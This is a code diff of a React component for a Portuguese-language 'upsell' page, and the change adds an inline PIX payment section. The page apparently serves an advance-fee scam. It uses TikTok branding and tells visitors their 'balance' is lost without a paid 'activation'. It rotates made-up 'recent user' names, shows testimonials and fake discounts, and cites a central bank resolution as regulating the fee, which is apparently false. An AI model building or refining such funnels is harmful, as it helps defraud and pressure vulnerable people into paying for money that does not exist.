@@ -1,21 +1,24 @@
 import { useState, useEffect, ReactNode } from "react";
 import { Loader2, ChevronRight, Shield, AlertTriangle, Lock, Zap, CheckCircle2, ChevronDown, ChevronUp } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import tiktokLogo from "@/assets/tiktok-logo.png";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellTENFProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; price?: string; anchorPrice?: string; discountLabel?: string; }
+interface FunnelUpsellTENFProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; price?: string; anchorPrice?: string; discountLabel?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 const FaqItem = ({ question, answer }: { question: string; answer: ReactNode }) => { const [open, setOpen] = useState(false); return (<div className="border-b border-gray-200 last:border-0"><button onClick={() => setOpen(!open)} className="w-full flex items-center justify-between py-2 text-left"><span className="text-gray-600 text-[11px] font-semibold pr-2">{question}</span>{open ? <ChevronUp className="w-3.5 h-3.5 text-gray-400 shrink-0" /> : <ChevronDown className="w-3.5 h-3.5 text-gray-400 shrink-0" />}</button>{open && <p className="text-gray-400 text-[11px] leading-relaxed pb-2">{answer}</p>}</div>); };
 
-const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, price = "R$ 42,91", anchorPrice = "R$ 97,90", discountLabel = "56% OFF" }: FunnelUpsellTENFProps) => {
+const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, price = "R$ 42,91", anchorPrice = "R$ 97,90", discountLabel = "56% OFF", pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellTENFProps) => {
   
   const [recentUser, setRecentUser] = useState("");
   const recentNames = ["Maria S.", "João P.", "Ana L.", "Carlos R.", "Fernanda M.", "Ricardo T.", "Patrícia G.", "Lucas H.", "Camila D.", "Bruno F."];
 
   const firstName = leadName ? leadName.split(" ")[0] : "";
   const maskCpf = (cpf: string) => cpf.length >= 11 ? `${cpf.slice(0, 3)}.***.***.${cpf.slice(-2)}` : cpf;
+  const showPixInline = !!pixData?.pix_code;
 
   
   useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 12000); return () => clearInterval(interval); }, []);
@@ -60,6 +63,11 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
           <p className="text-red-500 text-[10px] font-semibold mb-2">❌ {firstName ? `${firstName}, sem` : "Sem"} ativação = perda total do saldo de {balance}</p>
           <div className="flex items-center justify-center gap-1.5 mt-2.5"><Shield className="w-3 h-3 text-gray-300" /><span className="text-gray-400 text-[10px]">Pagamento seguro via PIX • Reembolso garantido</span></div>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount={price} label="Ativação TENF" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#10b981" />
+        )}
+
         <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
           <p className="text-gray-700 text-xs font-bold mb-2.5">Perguntas frequentes</p>
           <div className="space-y-1">
@@ -82,13 +90,15 @@ const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadN
         </div>
         <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil • Resolução nº 4.893</p>
       </main>
-      <StickyCtaBar
-        onClick={onGeneratePix}
-        isGenerating={isGenerating}
-        label="LIBERAR MEU SAQUE AGORA"
-        bgColor="bg-emerald-500"
-        shadowColor="shadow-emerald-500/30"
-      />
+      {!showPixInline && (
+        <StickyCtaBar
+          onClick={onGeneratePix}
+          isGenerating={isGenerating}
+          label="LIBERAR MEU SAQUE AGORA"
+          bgColor="bg-emerald-500"
+          shadowColor="shadow-emerald-500/30"
+        />
+      )}
     </div>
   );
 };
